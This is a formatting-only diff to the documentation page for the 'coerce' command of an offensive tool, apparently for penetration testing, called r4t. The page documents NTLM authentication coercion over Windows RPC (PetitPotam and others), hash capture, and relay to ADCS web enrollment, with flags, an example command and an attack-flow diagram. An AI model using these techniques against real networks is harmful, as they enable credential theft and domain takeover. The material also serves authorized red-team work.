@@ -1,3 +1,7 @@
+---
+title: "Coerce"
+---
+
 # coerce
 
 The `coerce` command performs authentication coercion attacks — forcing a remote machine to authenticate back to an attacker-controlled listener using various Windows RPC protocols. This is used to capture Net-NTLMv2 hashes or relay authentication to other services (e.g., LDAP, SMB, ADCS web enrollment).
@@ -6,7 +10,7 @@ The `coerce` command performs authentication coercion attacks — forcing a remo
 
 ## Usage
 
-```
+```text
 r4t coerce <method> [target] [flags]
 ```
 
@@ -17,7 +21,7 @@ r4t coerce <method> [target] [flags]
 These flags are shared across all coercion methods:
 
 | Flag | Short | Description |
-|------|-------|-------------|
+| --- | --- | --- |
 | `--listener` | `-L` | Attacker listener IP or hostname **(required)** |
 | `--username` | `-u` | Username for RPC authentication to target |
 | `--password` | `-p` | Password for RPC authentication |
@@ -35,21 +39,21 @@ These flags are shared across all coercion methods:
 When `--relay <host>` is set, R4t starts a built-in relay server alongside the coercion attack and forwards captured authentication to the specified target. These flags are available on every method subcommand.
 
 | Flag | Description |
-|------|-------------|
+| --- | --- |
 | `--relay <host>` | Relay target host — enables the built-in relay server |
-| `--adcs` | Relay type: SMB→HTTP(S) to Certificate Authority (ESC8) *(default when no type is set)* |
-| `--smb` | Relay type: SMB→SMB *(not yet implemented)* |
-| `--ldap` | Relay type: SMB→LDAP *(not yet implemented)* |
-| `--ldaps` | Relay type: SMB→LDAPS *(not yet implemented)* |
-| `--shadow-credentials` | Relay type: Shadow Credentials via LDAP *(not yet implemented)* |
-| `--mssql` | Relay type: SMB→MSSQL *(not yet implemented)* |
+| `--adcs` | Relay type: SMB→HTTP(S) to Certificate Authority (ESC8) _(default when no type is set)_ |
+| `--smb` | Relay type: SMB→SMB _(not yet implemented)_ |
+| `--ldap` | Relay type: SMB→LDAP _(not yet implemented)_ |
+| `--ldaps` | Relay type: SMB→LDAPS _(not yet implemented)_ |
+| `--shadow-credentials` | Relay type: Shadow Credentials via LDAP _(not yet implemented)_ |
+| `--mssql` | Relay type: SMB→MSSQL _(not yet implemented)_ |
 
 ### ADCS Relay Options
 
 These flags apply when using `--adcs` (or when no relay type is specified, since ADCS is the default).
 
 | Flag | Description |
-|------|-------------|
+| --- | --- |
 | `--template <name>` | Certificate template to request **(required for ADCS relay)** |
 | `--https` | Use HTTPS when relaying to the CA (default: HTTP port 80) |
 | `--relay-port <port>` | Override the port on the relay target (0 = protocol default) |
@@ -58,7 +62,7 @@ These flags apply when using `--adcs` (or when no relay type is specified, since
 ### Shadow Credentials Relay Options
 
 | Flag | Description |
-|------|-------------|
+| --- | --- |
 | `--shadow-target <account>` | Account to inject shadow credentials into |
 
 ---
@@ -79,6 +83,7 @@ r4t coerce petitpotam --listener 10.10.10.100 \
 ```
 
 R4t tries each of these named pipes in sequence:
+
 1. `lsarpc`
 2. `efsr`
 3. `samr`
@@ -140,7 +145,7 @@ r4t coerce interactive
 #### TUI Controls
 
 | Key | Action |
-|-----|--------|
+| --- | --- |
 | `Tab` | Switch between the listener panel and coercion panel |
 | `Ctrl+K` | Kill the listener |
 | `Ctrl+P` | Pause / resume the listener |
@@ -153,7 +158,7 @@ r4t coerce interactive
 
 Authentication coercion exploits Windows RPC protocols that make outbound network calls using the machine account's credentials. When you trigger one of these calls with a listener IP as the destination, the target machine authenticates to your listener.
 
-```
+```text
 Attacker (r4t coerce)          Target Machine             Attacker Listener
         │                            │                           │
         │── RPC Call (trigger) ──►   │                           │
@@ -163,6 +168,7 @@ Attacker (r4t coerce)          Target Machine             Attacker Listener
 ```
 
 The captured authentication can be:
+
 - **Cracked offline** (Net-NTLMv2 → password)
 - **Relayed** to another service (LDAP, SMB, ADCS web enrollment)
 
@@ -231,7 +237,7 @@ r4t dbquery "SELECT * FROM coercables"
 Hosts identified as potentially coercible are stored in the `coercables` table:
 
 | Column | Description |
-|--------|-------------|
+| --- | --- |
 | Host | Hostname or IP |
 | Method | Which RPC protocol is likely exploitable |
 | Notes | Additional context |
